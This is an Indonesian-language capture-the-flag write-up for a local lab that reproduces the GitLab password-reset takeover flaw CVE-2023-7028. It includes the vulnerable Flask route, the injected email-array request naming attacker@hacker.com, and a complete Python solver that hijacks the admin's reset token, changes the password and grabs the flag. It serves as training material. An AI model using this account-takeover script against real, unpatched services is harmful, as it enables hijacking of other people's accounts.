# WriteUp - Pwn The Gitforge

## Overview

* **Judul:** Pwn The Gitforge
* **Kategori:** Access Control / Cve
* **Poin:** 60
* **Deskripsi:** Ambil alih akun admin. Akses email: http://localhost:8025
* **Author:** -
* **URL:** `http://localhost:1337`

## Attachment Information & Directory Structure

Konfigurasi lingkungan Docker yang diberikan dari file attachment.

```bash
▶  cat gitforge.yml
services:
  web:
    image: ghcr.io/hengkerrusia/gitforge:latest
    container_name: gitforge-lab
    ports:
      - "1337:80"
    environment:
      - PWN=${PWN:-testuser}
      - SECRET_KEY=${SECRET_KEY:-gitforge-secret-key-2024}
      - SMTP_HOST=mailhog
      - SMTP_PORT=1025
    depends_on:
      - mailhog
    restart: unless-stopped
    networks:
      - gitforge-net

  mailhog:
    image: mailhog/mailhog:latest
    container_name: gitforge-mailhog
    ports:
      - "8025:8025"
      - "1025:1025"
    restart: unless-stopped
    networks:
      - gitforge-net

networks:
  gitforge-net:
    driver: bridge

```

Output eksekusi proses *build* kontainer:

```bash
▶  PWN=WanZKey docker compose -f gitforge.yml up -d --build
[+] Running 21/21
 ✔ web Pulled                                                                 13.3s
 ✔ mailhog Pulled                                                            145.1s
[+] Running 3/3
 ✔ Network pwnthegitforge_gitforge-net  Created                                0.6s
 ✔ Container gitforge-mailhog           Started                                5.1s
 ✔ Container gitforge-lab               Started                                4.1s

```

Pemeriksaan source code menggunakan `cat`:

```bash
▶  docker exec gitforge-lab cat app/routes.py
... [snip] ...
@app.route('/users/password', methods=['POST'])
def forgot_password():
...
    emails = request.form.getlist('user[email][]')

    if not emails:
        single_email = request.form.get('user[email]', '').strip()
        if single_email:
            emails = [single_email]
...
    target_user = None
    for email in emails:
        if not _is_valid_email(email):
            continue
        user = get_user_by_email(email)
        if user and user.is_active:
            target_user = user
            break

    if target_user:
        token = generate_reset_token(target_user)

        for email in emails:
            if not _is_valid_email(email):
                continue
            try:
                msg = Message(
                    subject='Password Reset Instructions - GitForge',
                    recipients=[email],
...

```

## Proses Penyelesaian

### Reconnaissance & Code Analysis

Aplikasi ini merupakan simulasi dari *version control system* GitForge yang dibangun menggunakan Python (Flask). Terdapat dua komponen utama, yaitu aplikasi web (`gitforge-lab`) yang berjalan di port 1337 dan server SMTP *mocking* (`mailhog`) yang berjalan di port 8025.

Terdapat implementasi *security policy* standar RFC 9116 pada `/well-known/security.txt` yang memuat alamat email administrator sesungguhnya. Endpoint ini digunakan untuk mengambil alamat email admin target secara dinamis karena *environment* menginisiasinya dengan *string* acak setiap kali dibangun.

```bash
▶  curl http://localhost:1337/.well-known/security.txt
# Security Policy
# Report security issues to our team

Contact: mailto:admin_lu7lrr6e@gitforge.local
...

```

### Vulnerability Analysis (CVE-2023-7028 Reference)

Kerentanan pada aplikasi ini mengadopsi struktur cacat logika dari **CVE-2023-7028** (GitLab Account Takeover via Password Reset).

Pada file `app/routes.py` di fungsi `forgot_password()`, aplikasi menerima input beruba *array* dari parameter `user[email][]`. Logika pencarian target akan melakukan validasi pada elemen pertama dari array tersebut. Apabila email valid dan terdaftar (dalam hal ini email admin target), aplikasi akan menggenerasi sebuah `reset_token` yang sah untuk akun tersebut.

Namun, cacat fatal terjadi pada blok eksekusi pengiriman *email*:

```python
        for email in emails:
            # ...
            msg = Message(
                subject='Password Reset Instructions - GitForge',
                recipients=[email],

```

Sistem akan melakukan *looping* pada seluruh array email yang dikirim dalam request awal dan mengirimkan email berisi token *reset* milik admin ke **semua** alamat yang ada di array tersebut, termasuk ke email milik penyerang (`attacker@hacker.com`).

### Exploitation

Eksploitasi dapat dirangkai dengan urutan otomasi:

* Mengambil alamat email target dari `/.well-known/security.txt`.
* Mengirim request HTTP POST ke endpoint `/users/password` dengan parameter *array* yang disuntikkan:
`user[email][]=admin_lu7lrr6e@gitforge.local&user[email][]=attacker@hacker.com`
* Menghubungi MailHog API (`/api/v2/messages`) untuk menarik *raw email* yang dikirimkan ke `attacker@hacker.com` dan memanipulasi *Quoted-Printable Encoding* (`=\r\n` dan `=3D`) untuk mengekstrak token secara bersih.
* Melakukan request perubahan *password* ke endpoint `/users/password` menggunakan *method* `PUT` dengan *token* yang telah dibajak.
* Melakukan otentikasi menggunakan kredensial yang baru ke `/users/sign_in`.
* Mengambil nilai bendera dari halaman `/dashboard`.

### Script Solver

```python
import requests
import re
import time
import json

BASE_URL = "http://localhost:1337"
MAILHOG_URL = "http://localhost:8025"
SESSION = requests.Session()

def exploit():
    print("[*] Starting GitForge Account Takeover (CVE-2023-7028)...")

    print("[*] 0. Enumerating target email from security.txt...")
    sec_res = SESSION.get(f"{BASE_URL}/.well-known/security.txt")
    match_email = re.search(r'mailto:([^\s]+)', sec_res.text)
    
    if not match_email:
        print("[-] Gagal menemukan email target di security.txt.")
        return
        
    target_email = match_email.group(1)
    print(f"[+] Target Email found: {target_email}")

    print("[*] 1. Sending malicious password reset request...")
    reset_data = {
        "authenticity_token": "dummy_csrf_token_for_lab_12345_long_enough",
        "user[email][]": [target_email, "attacker@hacker.com"]
    }
    SESSION.post(f"{BASE_URL}/users/password", data=reset_data)

    print("[*] 2. Checking MailHog for the hijacked reset token...")
    time.sleep(3)

    try:
        mail_res = requests.get(f"{MAILHOG_URL}/api/v2/messages")
        messages = mail_res.json().get("items", [])
    except Exception as e:
        print("[-] Gagal konek ke MailHog API.")
        return

    reset_token = None
    for msg in messages:
        if "attacker@hacker.com" in str(msg):
            body = msg.get("Content", {}).get("Body", "")
            clean_body = body.replace("=\r\n", "").replace("=3D", "=")
            
            match_token = re.search(r'reset_password_token=([A-Za-z0-9_-]{20,})', clean_body)
            if match_token:
                reset_token = match_token.group(1)
                break
                
    if not reset_token:
        print("[-] Gagal mendapatkan token dari MailHog.")
        return

    print(f"[+] Hijacked Reset Token: {reset_token}")

    print("[*] 3. Changing admin password...")
    new_password = "HackedPassword123!"
    change_data = {
        "authenticity_token": "dummy_csrf_token_for_lab_12345_long_enough",
        "_method": "put",
        "user[reset_password_token]": reset_token,
        "user[password]": new_password,
        "user[password_confirmation]": new_password
    }
    SESSION.post(f"{BASE_URL}/users/password", data=change_data)

    print("[*] 4. Logging in as admin...")
    login_data = {
        "user[login]": target_email,
        "user[password]": new_password
    }
    SESSION.post(f"{BASE_URL}/users/sign_in", data=login_data)

    print("[*] 5. Accessing dashboard to grab the flag...")
    dashboard_res = SESSION.get(f"{BASE_URL}/dashboard")

    match_flag = re.search(r'(flag\{[^}]+\}|pwn\{[^}]+\})', dashboard_res.text)
    if match_flag:
        print("\n" + "="*40)
        print(f"[+] PWNED! Flag Extracted:\n{match_flag.group(1)}")
        print("="*40 + "\n")
    else:
        print("[-] Flag tidak ditemukan di dashboard. Mungkin login gagal?")

if __name__ == "__main__":
    exploit()

```

### Output Terminal

```bash
▶  ./exploit.py
[*] Starting GitForge Account Takeover (CVE-2023-7028)...
[*] 0. Enumerating target email from security.txt...
[+] Target Email found: admin_lu7lrr6e@gitforge.local
[*] 1. Sending malicious password reset request...
[*] 2. Checking MailHog for the hijacked reset token...
[+] Hijacked Reset Token: lWEiTIi--bLyY_zIZCZT6gMVGlnhjUW0Cv_8-Tmn2bo
[*] 3. Changing admin password...
[*] 4. Logging in as admin...
[*] 5. Accessing dashboard to grab the flag...

========================================
[+] PWNED! Flag Extracted:
pwn{bdd7b8f255f03add43c4204bd03f8b69}
========================================

```

## Flag

```
pwn{bdd7b8f255f03add43c4204bd03f8b69}

```
